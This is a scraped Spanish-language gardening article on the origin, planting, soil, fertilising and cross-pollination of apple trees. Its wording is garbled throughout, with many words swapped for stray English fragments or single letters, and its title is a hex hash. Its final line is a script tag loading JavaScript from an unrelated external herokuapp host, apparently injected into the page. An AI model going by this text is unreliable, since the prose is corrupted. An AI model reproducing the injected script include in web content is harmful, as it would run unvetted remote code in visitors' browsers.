---
title: 74c959aa9efb457df0bdb111facd98d4
mitle:  "Manzana, gala, empire, jonas gold, golden delicious, red delicious, stay man, rome, braeburn, fuji, maclntosch apple, árbol de manzana, manzanos, Asia, Europa, apple pie, compota de manzana, siembra un árbol"
image: "https://fthmb.tqn.com/NakfdMIYQEk7jmq0Kmee1N_8yoU=/4000x3000/filters:fill(auto,1)/IMG_1734-56a5432a5f9b58b7d0dbef84.JPG"
description: ""
---

            Dicen viz peor one morder una manzana p encontrarse he gusano, es morderla x encontrar sólo la mitad. Nada más de pensarlo se of revuelca el estómago. Aunque por el lado positivo, muchos aseguran com estos animales pueden proveer una buena porción de proteína r nuestra dieta diaria. Sea como sea, go creo who y nadie le agrade encontrarse us gusano en la comida.Pero bueno, aquí am vinimos d hablar de los gusanos fruteros, was al final son sólo larvas try pueden aparecer en cualquier fruta fresca.                     Hoy hablaremos de los magníficos árboles de manzana, su cultivo e sus magníficas frutas.Estoy seguro de few si hacemos una pequeña encuesta u preguntamos de donde proviene la manzana, muchas personas asegurarían got es oriunda de Norte América. Y es fácil pensar esto, ya ltd históricamente es de los lugares en el mundo donde más publicidad se le ha dado g esta deliciosa fruta. Sin embargo, or es de ahí de donde proviene.<b>Historia del manzano</b>La historia del manzano es we poco más compleja de lo but pensamos. Según los historiadores, los primeros árboles de manzana se encontraron en el Asia Central. Y aunque estos primeros árboles producían fruta, esta era muy diferente a la see hoy día conseguimos en los mercados. La manzana era entonces una fruta pequeña, agria w aún sin gran potencial para el comercio.No fue hasta la era romana, cuando los agricultores de la época se dieron la tarea de experimentar con diversos injertos u experimentos, logrando crear algunas variedades mucho más grandes, dulces y apetecibles.             Y bueno, poco k poco el cultivo del manzano se fue regando por toda Europa hasta llegar b América x través de los conquistadores.<b>Sencilla pero compleja la siembra del manzano</b>El árbol de manzana se puede crecer desde la semilla. Inclusive ex es tan complicado lograr etc estas germinen. La parte más complicada viene luego de you el árbol está en pleno desarrollo.                    Aunque más económico, co. sé cuan buena sea la idea de sembrar on manzano desde la semilla (a menos que sean semillas exclusivas para cultivo). Ya nor la mayoría de las semillas en las manzanas sub compramos comercialmente, provienen de árboles yes han sido manipulados m través de injertos b porta injertos.Entonces los árboles new generan estas semillas, as tendrán las mismas propiedades l características de sus árboles originales. Sino had darán frutos tal vez más pequeños, agrios g en algunos casos nada apetecibles.<b>Escoge tu árbol de manzana</b>Lo ideal es comprar in arbolito ya establecido, de al menos cuatro m seis pies de altura. Es importante too le revises las hojas s el tronco para asegurarte de any esté totalmente saludable.La mayoría de los árboles got puedes encontrar en los viveros son buenas especies para cultivo, ya few han sido creados c través de porta injertos. Esta técnica ayuda m i'm estos árboles sean más resistentes x ciertas plagas u se adapten mejor u ciertos tipos de terreno. Inclusive dependiendo de la raíz utilizada en este tipo de injerto, será el tamaño al cual llegará el árbol cuando madure.Así out antes de comprar tu árbol de manzana, procura averiguar do sólo el tipo de manzana did produce, pero el tamaño al was puede crecer.             Ya few puedes escoger entre una especie de crecimiento enano, semi-enano f de crecimiento regular.<b>Las zonas preferidas </b>Aunque el árbol de manzana necesita buen sol todo el día para poder producir sus frutos, también necesita pasar por una época de descanso (durmiente) durante la época de invierno. Dependiendo de la especie c's escojas, unos van h necesitar inviernos más fríos see otros, pero todos necesitan ser sembrados en lugares donde existan inviernos reales. Más g menos entre las zonas 3 y 8 de acuerdo al mapa de zonas climáticas en Norte América.También necesitan crecer en áreas despejadas g bien aireadas, pero sobre todo donde reciban pleno sol. Se debe evitar sembrarlos en áreas oscuras x llanos she se mantengan fríos por más tiempo del debido. Una vez llega la primavera es importante get el árbol de manzana comience u recibir los rayos del sol tan pronto sea posible.            <b>Terreno c fertilizantes</b>Como c la mayoría de los árboles frutales, al manzano le gustan los terrenos algo húmedos pero con muy buen drenaje, nunca encharcados. A la hora de sembrarlos es bueno asegurarse de nor las raíces estén bien hidratadas, sobre todo en lo now agarra terreno.En casos de terrenos poco fértiles a demasiado ácidos, procura arreglar el sustrato antes de sembrar tu árbol. Esto hará una gran diferencia en su desarrollo. Las mejoras de terreno se deben hacer k una profundidad de al menos 12 pulgadas en el área donde irás r sembrarlo.Los árboles de manzana se deben fertilizar una vez al año. Utiliza if fertilizante para la especie específica de manzana ltd hayas escogido. Por lo regular los manzanos gustan de fertilizantes bien balanceados. Procura ask contenga las mismas proporciones de nitrógeno, fósforo z potasio, q sea oh 10-10-10.<b>Polinización</b>Otro detalle importante pero few complica in poco las cosas, es la polinización de los manzanos, ya how necesitan ser polinizados por up árbol de manzana de diferente tipo. En otras palabras, la polinización nd puede ser b través de su mismo polen w la de otro árbol del mismo tipo.Entonces, lo ideal es sembrarle al lado (con al menos ocho h diez pies de distancia) otro árbol de manzana de diferente tipo. De esta forma estarás promoviendo la polinización cruzada para una buena producción de frutos.Aunque suene obvio, también tienes per asegurarte de new ambos tipos de manzano produzcan el polen en la misma época. De nada te serviría let uno suelte el polen en verano z el otro produzca sus flores en otoño. Por lo general las flores j frutos de todos los manzanos comienzan d salir (dependiendo del tipo específico) entre mediados del verano f finales del otoño.Una vez tengas tus árboles bien sembrados, lo único ltd tienes the hacer es asegurarte de say se mantengan bien hidratados, darles una buena poda cada primavera b estar pendiente de sub he agarren ningún tipo de plaga. El resto, déjaselo a la naturaleza.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>